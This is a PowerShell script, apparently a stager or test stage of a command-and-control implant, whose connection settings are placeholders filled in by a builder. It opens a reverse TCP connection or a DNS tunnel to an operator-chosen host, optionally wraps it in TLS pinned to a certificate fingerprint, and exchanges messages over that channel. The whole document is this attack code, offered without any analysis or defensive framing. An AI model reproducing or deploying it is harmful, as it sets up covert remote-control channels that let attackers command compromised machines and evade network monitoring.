
# Recycle stager variables
if ($fp) {
    $servercertfp = $fp
} else {
    $servercertfp = "SYREPLACE_SERVERCERTFINGERPRINT"
}

$CONNECTIONMETHOD = "SYREPLACE_CONNECTIONMETHOD"
$CHANNELENCRYPTION = "SYREPLACE_CHANNELENCRYPTION"
$CONNECTHOST = "SYREPLACE_CONNECTHOST"
$CONNECTPORT = "SYREPLACE_CONNECTPORT"
$DNSZONE = "SYREPLACE_DNSZONE"
$DNSSERVER = "SYREPLACE_DNSSERVER"
$TIMEOUT = "SYREPLACE_TIMEOUT"
$RETRIES = "SYREPLACE_RETRIES"

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    $initialtransport = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
} elseif ($CONNECTIONMETHOD -eq "DNS") {
    $initialtransport = Transport-Dns-Open -Zone $DNSZONE -DnsServer $DNSSERVER -timeout $TIMEOUT -retries $RETRIES
} else {
    Write-Output "ERROR: connection method not defined"
    Exit(1)
}

if ($CHANNELENCRYPTION -eq "NONE") {
    Write-Output "Warning: CONNECTION UNENCRYPTED"
    $transport = $initialtransport
} elseif ($CHANNELENCRYPTION -eq "TLS") {
    if ($CONNECTIONMETHOD -eq "REVERSETCP") {
        $stream = $initialtransport.tcpStream
    } elseif ($CONNECTIONMETHOD -eq "DNS") {
        $stream = $initialtransport.stream
    }
    $transport = Transport-Tls-Open $stream $servercertfp
} else {
    Write-Output "ERROR: wrapper method not defined"
    Exit(1)
}

$res = Message-ParseFromTransport $transport
$res.content -join '' | Write-Output
$message1 = Message-Create -MType 4 -Content "Test"
Message-SendToTransport $message1 $transport
$res = Message-ParseFromTransport $transport
$res.content -join '' | Write-Output

if ($CHANNELENCRYPTION -eq "TLS") {
    Transport-Tls-Close $transport
}

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    Transport-ReverseTcp-Close $initialtransport
} elseif ($CONNECTIONMETHOD -eq "DNS") {
    Transport-Dns-Close $initialtransport
}